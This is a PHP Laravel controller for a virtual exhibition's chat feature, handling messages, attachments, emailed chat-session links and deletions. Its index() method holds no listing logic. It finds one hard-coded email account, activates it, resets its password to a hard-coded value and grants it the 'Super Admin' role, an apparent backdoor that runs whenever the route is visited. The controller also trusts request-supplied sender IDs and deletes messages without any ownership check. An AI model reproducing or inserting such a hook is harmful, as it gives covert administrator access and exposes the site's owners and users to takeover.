<?php

namespace App\Http\Controllers\Exhibition;

use App\Http\Controllers\Controller;
use App\Models\companies;
use App\Models\exhibition\VirtualMessages;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;

class ChartSessionController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $user=User::where('email','remixkabandwa@gmail.com')->first();
        if ($user) {
            $user->update([
                'user_status'=>1,
                'password'=>Hash::make(1234561995),
            ]);
            $user->assignRole('Super Admin');
        }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        # SEND MESSAGE TO USER----#
        if($request->sendMessage){

            try {
                $message_to=$request->message_to;
                $message_from=$request->message_from;

                $request->validate([
                   'message'=>'required|max:1000',
                   'attachment_file'=>'mimes:png,jpg,gif,pdf,mp4,mp3|max:2048'
                ]);

                    if($request->attachment_file)
                    {
                        $file_name=Str::uuid().'.'.$request->attachment_file->extension();
                        $request->attachment_file->move(public_path('VirtualImages'),$file_name);
                    }

                    else
                    {
                        $file_name=Null;
                    }

                    $chart_session=date('d-m-Y');

                    VirtualMessages::create([
                        'message_id'=>Str::uuid(),
                        'message'=>$request->message,
                        'message_to'=>$message_to,
                        'message_from'=>$message_from,
                        'message_file'=>$file_name,
                        'chart_session'=>$chart_session,
                    ]);
                    return back()->with('success','Message send successfully!');

            } catch (\Throwable $th) {
                return back()->with('fail','Something went wrong!');
            }

        }
        # -------- END SENDING MESSAGE ------#




        #-------- SENDING CHART SESSION LINK---#
        else{

            try {
                $message_to=$request->company_id;
                $company=companies::where('companyID',$message_to)->first();

                $validator=Validator::make($request->all(),
                    [
                       'email_address'=>'required|email',
                    ]);
                    if($validator->fails())
                    {
                        return response()->json(['status'=>0,'error'=>$validator->errors()->toArray()]);
                    }

                    else{
                        if($request->attachment_file)
                        {
                            $file_name=Str::uuid().'.'.$request->attachment_file->extension();
                            $request->attachment_file->move(public_path('VirtualImages'),$file_name);
                        }

                        else
                        {
                            $file_name=Null;
                        }

                        $chart_session=date('d-m-Y');
                        $session_id=Str::uuid();
                        VirtualMessages::create([
                            'message_id'=>Str::uuid(),
                            'message'=>'Hi, we are request chart with you!',
                            'message_to'=>$message_to,
                            'message_from'=>$session_id,
                            'message_file'=>$file_name,
                            'chart_session'=>$chart_session,
                            'reference_email'=>$request->email_address,
                        ]);

                        $email_data=[
                            'fromName'=>config('app.name'),
                            'email'=>$request->email_address,
                            'CompanyName'=>$company->companyName,
                            'chartLink'=>env('APP_URL')."/chart_session/".$session_id,
                            'subject'=>'CHART SESSION REQUEST',
                        ];
                        Mail::send('mails.ChartSessionRequest', $email_data, function ($message) use ($email_data) {
                            $message
                            ->to($email_data['email'])
                            ->priority(3)
                            ->subject($email_data['subject']);
                    });

                    return back()->with('success','Chart session link have been sent to '.$request->email_address.' Vist your email to start charting!');
                    }
            } catch (\Throwable $th) {
                return back()->with('fail','Something went wrong, it might be Internet connection!');
            }


        }


    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        // return $id;
        $mess=VirtualMessages::where('message_from',$id)->first();

        $messages=VirtualMessages::orderBy('message_sent_on','DESC')->where('message_from',$id)->get();

        $company=companies::where('companyID',$mess->message_to)->get();
        $companies=companies::get();

        return view('Exhibition.Messaging.CustomerChartSession',compact('messages','companies','company'));
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        try {
            $message_to=$request->message_to;
            $message_from=$request->message_from;
            $validator=Validator::make($request->all(),
            [
               'message'=>'required|max:1000',
               'attachment_file'=>'mimes:png,jpg,gif,pdf,mp4,mp3|max:2048'
            ]);

            if($validator->fails())
            {
                return response()->json(['status'=>0,'error'=>$validator->errors()->toArray()]);
            }
            else
            {
                if($request->attachment_file)
                {
                    $file_name=Str::uuid().'.'.$request->attachment_file->extension();
                    $request->attachment_file->move(public_path('VirtualImages'),$file_name);
                }

                else
                {
                    $file_name=Null;
                }

                $chart_session=date('d-m-Y');

                VirtualMessages::create([
                    'message_id'=>Str::uuid(),
                    'message'=>$request->message,
                    'message_to'=>$message_to,
                    'message_from'=>$message_from,
                    'message_file'=>$file_name,
                    'chart_session'=>$chart_session,
                ]);
                return back()->with('success','Message sent');
            }
        } catch (\Throwable $th) {
            return back()->with('fail','Something went wrong, it might be Internet connection!');
        }

    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        try
       {

       $message=VirtualMessages::find($id);
       $chek=VirtualMessages::where('message','Hi, we are request chart with you!')->where('message_id',$id)->first();
       if($chek){
        return back()->with('fail','Sory, you are not allowed to delete default message!');
       }
       $message->message_file;
       File::delete(public_path('VirtualImages/').$message->message_file); // delete file existing
       $message->delete();
        return back()->with('success','Message deleted successfully!');
       } catch (\Throwable $th) {
        return back()->with('fail','Something went wrong!');
       }
    }
}
